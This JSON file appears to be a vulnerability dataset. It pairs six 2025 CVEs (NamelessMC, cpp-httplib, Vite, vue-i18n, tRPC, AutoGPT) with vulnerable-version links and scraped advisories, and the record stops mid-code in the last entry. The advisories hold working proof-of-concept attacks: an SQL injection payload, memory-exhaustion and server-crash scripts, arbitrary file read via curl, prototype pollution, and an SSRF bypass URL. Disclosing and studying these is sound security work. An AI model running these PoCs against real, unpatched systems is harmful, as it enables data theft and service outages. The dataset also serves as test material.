{
    "CVE-2025-32389": {
        "cwe": [
            {
                "id": "CWE-89",
                "value": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
            }
        ],
        "description": "NamelessMC is a free, easy to use & powerful website software for Minecraft servers. Prior to version 2.1.4, NamelessMC is vulnerable to SQL injection by providing an unexpected square bracket GET parameter syntax. Square bracket GET parameter syntax refers to the structure `?param[0]=a&param[1]=b&param[2]=c` utilized by PHP, which is parsed by PHP as `$_GET['param']` being of type array. This issue has been patched in version 2.1.4.",
        "languages": [
            "PHP",
            "Smarty"
        ],
        "patch_commits": [],
        "published_date": "2025-04-18T15:56:39.962Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nNamelessMC\n/\nNameless\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 317\nStar 632\nCode\nIssues\n111\nPull requests\n19\nDiscussions\nActions\nWiki\nSecurity\n8\nInsights\nAdditional navigation options\nSQL Injection using PHP square bracket GET parameter syntax\nCritical samerton published GHSA-5984-mhcp-cq2x last monthApr 17, 2025\nPackage\nNo package listed\nAffected versions\n<= 2.1.3\nPatched versions\n2.1.4\nDescription\nDescription\nNamelessMC is vulnerable to SQL injection by providing unexpected square bracket GET parameter syntax\nSquare bracket GET parameter syntax refers to the structure ?param[0]=a&param[1]=b&param[2]=c utilised by PHP, which is parsed by PHP as $_GET['param'] which is then of type array.\nThe method DB::makeWhere, which is used in many places to construct a MySQL statement, allows constructing WHERE clauses in several formats, such as\nmakeWhere(['id', '=', 1]); // where ID = 1\nmakeWhere(['id', 1]) // also where ID = 1\nAn example of where makeWhere is called is through the DB::get() method, such as\n$db = DB::getInstance();\n$db->get('table_name', ['id', $_GET['id']]);\nwhere $_GET['id'] is passed in directly from GET request parameters - intended to be passed through to makeWhere as ['id', 1] if $_GET['id'] equals 1.\nConsider $_GET['id'] is now provided using PHP's square bracket syntax - e.g. ?id[0]=a&id[1]=b - this will reach makeWhere as ['id', ['a', 'b']\nIn makeWhere is the following check\n  if (!is_array($clause)) {\n    continue;\n  }\nIf parameters are passed into makeWhere with structure [string, array] as above, then this check will be truthy and the loop will continue, meaning makeWhere will now move onto ['a', 'b'], treating 'a' as the table name and 'b' as the value to check in there WHERE clause. As table names are not parameterised, this is passed into the SQL query raw and thus opens the system to SQL injection.\nAn example of this, in a blind fashion, is on the route /user/messaging (modules/Core/pages/user/messaging.php, on action=new line 294). The uid query param is passed to the DB#get method without any validation. So you can pass the parameter in question as an array (uid[0]=thing&uid[1]thing2&...) and by the behaviour of DB#makeWhere, a WHERE clause can be created with an arbitrary table name like:\nthing` = 'uwu' UNION SELECT ... #\nand bypass the parametrized queries. As the page only puts valid usernames on the To field, it can be used to slowly extract data using boolean logic.\nAnother example is present on /panel/users/reports (modules/Core/pages/panel/users_reports.php, line 190) on the id parameter. But on this one the user can clearly see the result of the query being made.\nTo abuse the first one the attacker just needs to have the \"Member\" role and for the second, the attacker must have a role that can view user reports.\nImpact\nAn attacker can use this to dump internal and sensitive data from the website.\nSeverity\nCritical\n9.3\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nNone\nVulnerable System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N\nCVE ID\nCVE-2025-32389\nWeaknesses\nCWE-89\nCredits\nVz0n\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The security advisory provides both a detailed explanation of the vulnerability and examples of how it can be exploited.",
                "url": "https://github.com/NamelessMC/Nameless/security/advisories/GHSA-5984-mhcp-cq2x"
            }
        ],
        "sw_version": "v2.1.3",
        "sw_version_wget": "https://github.com/NamelessMC/Nameless/archive/refs/tags/v2.1.3.zip"
    },
    "CVE-2025-46728": {
        "published_date": "2025-05-06T00:45:25.130Z",
        "patch_commits": [],
        "sw_version": "v0.20.0",
        "sw_version_wget": "https://github.com/yhirose/cpp-httplib/archive/refs/tags/v0.20.0.zip",
        "description": "cpp-httplib is a C++ header-only HTTP/HTTPS server and client library. Prior to version 0.20.1, the library fails to enforce configured size limits on incoming request bodies when `Transfer-Encoding: chunked` is used or when no `Content-Length` header is provided. A remote attacker can send a chunked request without the terminating zero-length chunk, causing uncontrolled memory allocation on the server. This leads to potential exhaustion of system memory and results in a server crash or unresponsiveness. Version 0.20.1 fixes the issue by enforcing limits during parsing. If the limit is exceeded at any point during reading, the connection is terminated immediately. A short-term workaround through a Reverse Proxy is available. If updating the library immediately is not feasible, deploy a reverse proxy (e.g., Nginx, HAProxy) in front of the `cpp-httplib` application. Configure the proxy to enforce maximum request body size limits, thereby stopping excessively large requests before they reach the vulnerable library code.",
        "sec_adv": [
            {
                "url": "https://github.com/yhirose/cpp-httplib/security/advisories/GHSA-px83-72rx-v57c",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nyhirose\n/\ncpp-httplib\nPublic\nNotifications You must be signed in to change notification settings\nFork 2.4k\nStar 14.3k\nCode\nIssues\n19\nPull requests\n9\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nUnbounded Memory Allocation in Chunked/No-Length Requests\nHigh yhirose published GHSA-px83-72rx-v57c 2 weeks agoMay 5, 2025\nPackage\nNo package listed\nAffected versions\n<=0.20.0\nPatched versions\n0.20.1\nDescription\nSummary\nThe library fails to enforce configured size limits on incoming request bodies when Transfer-Encoding: chunked is used or when no Content-Length header is provided. A remote attacker can send a chunked request without the terminating zero-length chunk, causing uncontrolled memory allocation on the server. This leads to potential exhaustion of system memory and results in a server crash or unresponsiveness.\nDetails\nHTTP allows clients to send data in variable-sized chunks. Each chunk is preceded by its size in hexadecimal, followed by CRLF (\\r\\n), then the chunk data, and finally another CRLF. The entire transfer ends with a zero-length chunk (0\\r\\n) followed by an optional trailer section and a final CRLF.\nThe vulnerability exists because the server's read_content_chunked function (and associated stream reading logic) continuously reads incoming chunks, accumulating the data (either into req.body or passing it to a content receiver). Crucially, it fails to limit the total accumulated size during this reading process for chunked transfers.\nAn attacker can maintain the connection and send unlimited chunk data without the terminating chunk, forcing unbounded memory allocation. This vulnerability affects the server before request routing is completed, impacting even requests to non-existent paths.\nPoC\nTested on macOS 15.4.1 and Apple clang version 17.0.0 (clang-1700.0.13.3).\nServer:\n#include \"httplib.h\"\n\nint main() {\n  httplib::Server svr;\n  \n  svr.Get(\"/hi\", [](const httplib::Request &, httplib::Response &res) {\n    res.set_content(\"Hello World!\", \"text/plain\");\n  });\n  svr.set_payload_max_length(5 * 1024);\n  std::cout << \"Starting server\" << std::endl;\n  svr.listen(\"0.0.0.0\", 8080);\n  return 0;\n}\nClient:\nimport socket\nimport time\nimport sys\n\n# Target server details (adjust as needed)\nTARGET_HOST = \"127.0.0.1\"\nTARGET_PORT = 8080\n\n# Size of each data chunk to send\nCHUNK_SIZE = 4096 # 4 KB per chunk\nCHUNK_DATA = b'A' * CHUNK_SIZE\n\ndef send_chunk(sock, data):\n    \"\"\"Formats and sends a single chunk.\"\"\"\n    hex_len = hex(len(data))[2:].encode('ascii') # Get hex length (e.g., '1000' for 4096)\n    try:\n        sock.sendall(hex_len + b'\\\\r\\\\n' + data + b'\\\\r\\\\n')\n        # print(f\"Sent chunk: {len(data)} bytes\")\n        return True\n    except socket.error as e:\n        print(f\"Socket error during send: {e}\", file=sys.stderr)\n        return False\n\ndef main():\n    print(f\"[*] Attempting DoS attack on {TARGET_HOST}:{TARGET_PORT} via chunked encoding...\")\n\n    try:\n        # Create and connect socket\n        sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)\n        print(\"[+] Connected to server.\")\n\n        # Construct initial HTTP POST request headers\n        # Using a path like /post_target, though the specific path doesn't matter\n        # much as the vulnerability is in the core request reading.\n        request_headers = (\n            f\"POST /post_target HTTP/1.1\\\\r\\\\n\"\n            f\"Host: {TARGET_HOST}:{TARGET_PORT}\\\\r\\\\n\"\n            f\"Transfer-Encoding: chunked\\\\r\\\\n\"\n            f\"User-Agent: PoC-Client/1.0\\\\r\\\\n\"\n            f\"Connection: keep-alive\\\\r\\\\n\"\n            f\"\\\\r\\\\n\" # End of headers\n        ).encode('ascii')\n\n        # Send headers\n        sock.sendall(request_headers)\n        print(\"[+] Sent HTTP headers.\")\n        print(\"[*] Starting to send infinite chunks (press Ctrl+C to stop)...\")\n\n        # Send chunks indefinitely without the final '0\\\\r\\\\n\\\\r\\\\n'\n        bytes_sent = 0\n        start_time = time.time()\n        while True:\n            if not send_chunk(sock, CHUNK_DATA):\n                print(\"[-] Server connection closed unexpectedly.\")\n                break\n            bytes_sent += len(CHUNK_DATA)\n            # Optional: Slow down slightly to avoid overwhelming the network instantly\n            # time.sleep(0.01)\n\n            # Print status periodically\n            if bytes_sent % (CHUNK_SIZE * 100) == 0: # Print every 100 chunks\n                 elapsed = time.time() - start_time\n                 rate = bytes_sent / elapsed / (1024*1024) if elapsed > 0 else 0\n                 print(f\"[*] Sent {bytes_sent / (1024*1024):.2f} MB total ({rate:.2f} MB/s)...\")\n\n\n    except socket.timeout:\n        print(\"[-] Connection timed out.\", file=sys.stderr)\n    except socket.error as e:\n        print(f\"[-] Socket error: {e}\", file=sys.stderr)\n    except KeyboardInterrupt:\n        print(\"\\\\n[*] Attack stopped by user.\")\n    finally:\n        if 'sock' in locals() and sock:\n            print(\"[*] Closing socket.\")\n            sock.close()\n\nif __name__ == \"__main__\":\n    main() \nImpact\nDenial of Service: The server process will consume excessive memory until it crashes or becomes unresponsive.\nResource Exhaustion: On multi-tenant systems, this can impact other applications by consuming system resources.\nMitigation\nShort-term workaround through a Reverse Proxy: If updating the library immediately is not feasible, deploy a reverse proxy (e.g., Nginx, HAProxy) in front of the cpp-httplib application. Configure the proxy to enforce maximum request body size limits, thereby stopping excessively large requests before they reach the vulnerable library code.\nCode fix. Enforce limits during parsing. If the limit is exceeded at any point during reading, the connection should be terminated immediately (e.g., by returning an error or closing the stream).\nSeverity\nHigh\n7.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nCVE ID\nCVE-2025-46728\nWeaknesses\nCWE-400\nCredits\nthevilledev\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory provides a PoC code for a server in C++ and client in Python that demonstrates the exploitation of the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-400",
                "value": "CWE-400: Uncontrolled Resource Consumption"
            }
        ]
    },
    "CVE-2025-30208": {
        "published_date": "2025-03-24T17:03:40.728Z",
        "patch_commits": [],
        "sw_version": "v4.5.9",
        "sw_version_wget": "https://github.com/vitejs/vite/archive/refs/tags/v4.5.9.zip",
        "description": "Vite, a provider of frontend development tooling, has a vulnerability in versions prior to 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10. `@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes. The contents of arbitrary files can be returned to the browser. Only apps explicitly exposing the Vite dev server to the network (using `--host` or `server.host` config option) are affected. Versions 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10 fix the issue.",
        "sec_adv": [
            {
                "url": "https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvitejs\n/\nvite\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 6.7k\nStar 72.7k\nCode\nIssues\n473\nPull requests\n162\nDiscussions\nActions\nProjects\n1\nSecurity\n12\nInsights\nAdditional navigation options\nserver.fs.deny bypassed when using `?raw??`\nModerate sapphi-red published GHSA-x574-m823-4x7w on Mar 24Mar 24, 2025\nPackage\nnpm vite\n(\nnpm\n)\nAffected versions\n>=6.2.0, <=6.2.2\n>=6.1.0, <=6.1.1\n>=6.0.0, <=6.0.11\n>=5.0.0, <=5.4.14\n<=4.5.9\nPatched versions\n>=6.2.3\n>=6.1.2, <6.2.0\n>=6.0.12, <6.1.0\n>=5.4.15, <6.0.0\n>=4.5.10, <5.0.0\nDescription\nSummary\nThe contents of arbitrary files can be returned to the browser.\nImpact\nOnly apps explicitly exposing the Vite dev server to the network (using --host or server.host config option) are affected.\nDetails\n@fs denies access to files outside of Vite serving allow list. Adding ?raw?? or ?import&raw?? to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as ? are removed in several places, but are not accounted for in query string regexes.\nPoC\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\nSeverity\nModerate\n5.3\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2025-30208\nWeaknesses\nCWE-200 CWE-284\nCredits\nEzzer17\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The security advisory contains a section labeled 'PoC' that explains the steps to reproduce the vulnerability, along with example code and commands."
            }
        ],
        "cwe": [
            {
                "id": "CWE-200",
                "value": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
            },
            {
                "id": "CWE-284",
                "value": "CWE-284: Improper Access Control"
            }
        ]
    },
    "CVE-2025-27597": {
        "published_date": "2025-03-07T15:51:39.753Z",
        "patch_commits": [],
        "sw_version": "v9.1.0",
        "sw_version_wget": "https://github.com/intlify/vue-i18n/archive/refs/tags/v9.1.0.zip",
        "description": "Vue I18n is the internationalization plugin for Vue.js. @intlify/message-resolver and @intlify/vue-i18n-core are vulnerable to Prototype Pollution through the entry function: handleFlatJson. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence. Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.",
        "sec_adv": [
            {
                "url": "https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nintlify\n/\nvue-i18n\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 362\nStar 2.4k\nCode\nIssues\n133\nPull requests\n27\nDiscussions\nActions\nProjects\nSecurity\n3\nInsights\nAdditional navigation options\nPrototype Pollution in `handleFlatJson`\nHigh kazupon published GHSA-p2ph-7g93-hw3m on Mar 6Mar 7, 2025\nPackage\nnpm @intlify/core\n(\nnpm\n)\nAffected versions\n>= 9.1\nPatched versions\n9.1.11\nnpm @intlify/core-base\n(\nnpm\n)\n>= 9.1\n9.1.11\nnpm @intlify/message-resolver\n(\nnpm\n)\n>= 9.1\n9.1.11\nnpm @intlify/vue-i18n-core\n(\nnpm\n)\n>= 9.2 <= 11.1.1\n9.14.3, 10.0.6, 11.1.2\nnpm petite-vue-i18n\n(\nnpm\n)\n>= 10.0 <= 11.1.1\n10.0.6, 11.1.2\nnpm vue-i18n\n(\nnpm\n)\n>= 9.1 <= 11.1.1\n9.14.3, 10.0.6, 11.1.2\nDescription\nVulnerability type:\nPrototype Pollution\nVulnerability Location(s):\n# v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\nDescription:\nThe latest version of @intlify/message-resolver (9.1) and @intlify/vue-i18n-core (9.2 or later), (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) handleFlatJson. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\nPoC:\n// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n// poc.js\n(async () => {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\nSeverity\nHigh\nCVE ID\nCVE-2025-27597\nWeaknesses\nNo CWEs\nCredits\nmestrtee\nFinder\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory explicitly provides a proof of concept, including a specific code example and the expected result."
            }
        ],
        "cwe": [
            {
                "id": "CWE-1321",
                "value": "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
            }
        ]
    },
    "CVE-2025-43855": {
        "published_date": "2025-04-24T13:58:30.536Z",
        "patch_commits": [],
        "sw_version": "v11.0.0",
        "sw_version_wget": "https://github.com/trpc/trpc/archive/refs/tags/v11.0.0.zip",
        "description": "tRPC allows users to build & consume fully typesafe APIs without schemas or code generation. In versions starting from 11.0.0 to before 11.1.1, an unhandled error is thrown when validating invalid connectionParams which crashes a tRPC WebSocket server. This allows any unauthenticated user to crash a tRPC 11 WebSocket server. Any tRPC 11 server with WebSocket enabled with a createContext method set is vulnerable. This issue has been patched in version 11.1.1.",
        "sec_adv": [
            {
                "url": "https://github.com/trpc/trpc/security/advisories/GHSA-pj3v-9cm8-gvj8",
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ntrpc\n/\ntrpc\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 1.4k\nStar 37.3k\nCode\nIssues\n134\nPull requests\n48\nDiscussions\nActions\nSecurity\n1\nInsights\nAdditional navigation options\ntRPC 11 WebSocket DoS Vulnerability\nHigh KATT published GHSA-pj3v-9cm8-gvj8 3 weeks agoApr 24, 2025\nPackage\nnpm @trpc/server\n(\nnpm\n)\nAffected versions\nv11.0.0\nPatched versions\nv11.1.1\nDescription\nSummary\nAn unhandled error is thrown when validating invalid connectionParams which crashes a tRPC WebSocket server. This allows any unauthenticated user to crash a tRPC 11 WebSocket server.\nDetails\nAny tRPC 11 server with WebSocket enabled with a createContext method set is vulnerable. Here is an example:\ntrpc-vuln.mp4\nI have a working reproduction here if you would like to test: https://github.com/lukechilds/trpc-vuln-reproduction\nThe connectionParams logic introduced in #5839 does not safely handle invalid connectionParams objects. During validation if the object does not match an expected shape an error will be thrown:\ntrpc/packages/server/src/unstable-core-do-not-import/http/parseConnectionParams.ts\nLines 27 to 33 in 8cef54e\n } catch (cause) { \n   throw new TRPCError({ \n     code: 'PARSE_ERROR', \n     message: 'Invalid connection params shape', \n     cause, \n   }); \n } \nThis is called during WebSocket connection setup inside createCtxPromise() here:\ntrpc/packages/server/src/adapters/ws.ts\nLine 435 in 8cef54e\n const connectionParams = parseConnectionParamsFromUnknown(msg.data); \ncreateCtxPromise has handling to catch any errors and pass them up to the opts.onError handler:\ntrpc/packages/server/src/adapters/ws.ts\nLines 144 to 173 in 8cef54e\n   }).catch((cause) => { \n     const error = getTRPCErrorFromUnknown(cause); \n     opts.onError?.({ \n       error, \n       path: undefined, \n       type: 'unknown', \n       ctx, \n       req, \n       input: undefined, \n     }); \n     respond({ \n       id: null, \n       error: getErrorShape({ \n         config: router._def._config, \n         error, \n         type: 'unknown', \n         path: undefined, \n         input: undefined, \n         ctx, \n       }), \n     }); \n        // close in next tick \n     (globalThis.setImmediate ?? globalThis.setTimeout)(() => { \n       client.close(); \n     }); \n        throw error; \n   }); \n } \nHowever the error handler then rethrows the error:\ntrpc/packages/server/src/adapters/ws.ts\nLine 171 in 8cef54e\n throw error; \nSince this is all triggered from the WebSocket message event there is no higher level error handling so this causes an uncaught exception and crashes the server process.\nThis means any tRPC 11 server with WebSockets enabled can be crashed by an attacker sending an invalid connectionParams object. It doesn't matter if the server doesn't make user of connectionParams, the connectionParams logic can be initiated by the client.\nTo fix this vulnerability tRPC should not rethrow the error after it's be handled. This patch fixes the vulnerability:\nFrom 5747b1d11946f60268eb86c59784bd6f7eb50abd Mon Sep 17 00:00:00 2001\nFrom: Luke Childs <lukechilds123@gmail.com>\nDate: Sun, 20 Apr 2025 13:27:10 +0700\nSubject: [PATCH] Don't throw already handled error\n\nThis error has already been handled so no need to re-throw. If we re-throw it will not be caught and will trigger an uncaught exception causing the entire server process to crash.\n---\n packages/server/src/adapters/ws.ts | 2 --\n 1 file changed, 2 deletions(-)\n\ndiff --git a/packages/server/src/adapters/ws.ts b/packages/server/src/adapters/ws.ts\nindex ad869affd..5a578b5cb 100644\n--- a/packages/server/src/adapters/ws.ts\n+++ b/packages/server/src/adapters/ws.ts\n@@ -167,8 +167,6 @@ export function getWSConnectionHandler<TRouter extends AnyRouter>(\n         (globalThis.setImmediate ?? globalThis.setTimeout)(() => {\n           client.close();\n         });\n-\n-        throw error;\n       });\n     }\n\n--\n2.48.1\nPoC\nThis script will crash the target tRPC 11 server if WebSockets are enabled:\n#!/usr/bin/env node\n\nconst TARGET = 'ws://localhost:3000'\n\n// These malicious connection params will crash any tRPC v11.1.0 WebSocket server on validation\nconst MALICIOUS_CONNECTION_PARAMS = JSON.stringify({\n  method: \"connectionParams\",\n  data: { invalidConnectionParams: null },\n});\n\n// Open a connection to the target\nconst target = `${TARGET}?connectionParams=1`;\nconsole.log(`Opening a WebSocket to ${target}`);\nconst socket = new WebSocket(target);\n\n// Wait for the connection to be established\nsocket.addEventListener(\"open\", () => {\n  console.log(\"WebSocket established!\");\n\n  // Sends a message to the WebSocket server.\n  console.log(`Sending malicious connectionParams`);\n  socket.send(MALICIOUS_CONNECTION_PARAMS);\n  console.log(`Done!`);\n});\n\n// Handle errors\nsocket.addEventListener(\"error\", () => console.log(\"Error opening WebSocket\"));\nComplete PoC with vulnerable WebSocket server here: https://github.com/lukechilds/trpc-vuln-reproduction\nSeverity\nHigh\n8.7\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nNone\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\nCVE ID\nCVE-2025-43855\nWeaknesses\nNo CWEs\nCredits\nlukechilds\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes specific scripts and descriptions that recreate the described vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-248",
                "value": "CWE-248: Uncaught Exception"
            }
        ]
    },
    "CVE-2025-0454": {
        "published_date": "2025-03-20T10:11:30.365Z",
        "patch_commits": [],
        "sw_version": "v0.3.1",
        "sw_version_wget": "https://github.com/significant-gravitas/autogpt/archive/refs/tags/v0.3.1.zip",
        "description": "A Server-Side Request Forgery (SSRF) vulnerability was identified in the Requests utility of significant-gravitas/autogpt versions prior to v0.4.0. The vulnerability arises due to a hostname confusion between the `urlparse` function from the `urllib.parse` library and the `requests` library. A malicious user can exploit this by submitting a specially crafted URL, such as `http://localhost:\\@google.com/../`, to bypass the SSRF check and perform an SSRF attack.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/0664fdee-bdc2-4650-8075-74d7b8d3e308",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nSSRF check bypass in Requests utility in significant-gravitas/autogpt\nValid\nReported on Dec 4th 2024\nDescription\nThe autogpt application relies on a wrapper around the requests library in order to avoid SSRF attacks performing a check on the provided URL.\nSuch check is performed using the urlparse function from urllib.parse library, and the request is later performed using the requests library. Due to a hostname confusion between these two libraries, a malicious user is able to bypass such check by submitting a specially crafted URL in order to perform a SSRF attack.\nProof of Concept\nBy providing http://localhost:\\\\@google.com/../ as the URL to be used in the requests, it is possible to perform a SSRF attack. This is due to the fact that the \\ character in the authority is interpreted as a / by requests and not by the urlparse function, leading to a hostname confusion attack. The following example can be executed in order to verify such behavior\nimport ipaddress\nimport socket\nfrom urllib.parse import urlparse\nfrom typing import Callable\n\nimport requests as req\n\n# List of IP networks to block\nBLOCKED_IP_NETWORKS = [\n    # --8<-- [start:BLOCKED_IP_NETWORKS]\n    ipaddress.ip_network(\"0.0.0.0/8\"),  # \"This\" Network\n    ipaddress.ip_network(\"10.0.0.0/8\"),  # Private-Use\n    ipaddress.ip_network(\"127.0.0.0/8\"),  # Loopback\n    ipaddress.ip_network(\"169.254.0.0/16\"),  # Link Local\n    ipaddress.ip_network(\"172.16.0.0/12\"),  # Private-Use\n    ipaddress.ip_network(\"192.168.0.0/16\"),  # Private-Use\n    ipaddress.ip_network(\"224.0.0.0/4\"),  # Multicast\n    ipaddress.ip_network(\"240.0.0.0/4\"),  # Reserved for Future Use\n    # --8<-- [end:BLOCKED_IP_NETWORKS]\n]\n\n\ndef is_ip_blocked(ip: str) -> bool:\n    \"\"\"\n    Checks if the IP address is in a blocked network.\n    \"\"\"\n    ip_addr = ipaddress.ip_address(ip)\n    return any(ip_addr in network for network in BLOCKED_IP_NETWORKS)\n\n\ndef validate_url(url: str, trusted_origins: list[str]) -> str:\n    \"\"\"\n    Validates the URL to prevent SSRF attacks by ensuring it does not point to a private\n    or untrusted IP address, unless whitelisted.\n    \"\"\"\n    url = url.strip().strip(\"/\")\n    if not url.startswith((\"http://\", \"https://\")):\n        url = \"http://\" + url\n\n    parsed_url = urlparse(url)\n    hostname = parsed_url.hostname\n\n    if not hostname:\n        raise ValueError(f\"Invalid URL: Unable to determine hostname from {url}\")\n\n    if any(hostname == origin for origin in trusted_origins):\n        return url\n\n    # Resolve all IP addresses for the hostname\n    ip_addresses = {result[4][0] for result in socket.getaddrinfo(hostname, None)}\n    if not ip_addresses:\n        raise ValueError(f\"Unable to resolve IP address for {hostname}\")\n\n    # Check if all IP addresses are global\n    for ip in ip_addresses:\n        if is_ip_blocked(ip):\n            raise ValueError(\n                f\"Access to private IP address at {hostname}: {ip} is not allowed.\"\n            )\n\n    return url\n\n\nclass Requests:\n    \"\"\"\n    A wrapper around the requests library that validates URLs before making requests.\n    \"\"\"\n\n    def __init__(\n        self,\n        trusted_origins: list[str] | None = None,\n        raise_for_status: bool = True,\n        extra_url_validator: Callable[[str], str] | None = None,\n        extra_headers: dict[str, str] | None = None,\n    ):\n        self.trusted_origins = []\n        for url in trusted_origins or []:\n            hostname = urlparse(url).hostname\n            if not hostname:\n                raise ValueError(f\"Invalid URL: Unable to determine hostname of {url}\")\n            self.trusted_origins.append(hostname)\n\n        self.raise_for_status = raise_for_status\n        self.extra_url_validator = extra_url_validator\n        self.extra_headers = extra_headers\n\n    def request(\n        self, method, url, headers=None, allow_redirects=False, *args, **kwargs\n    ) -> req.Response:\n        if self.extra_headers is not None:\n            headers = {**(headers or {}), **self.extra_headers}\n\n        url = validate_url(url, self.trusted_origins)\n        if self.extra_url_validator is not None:\n    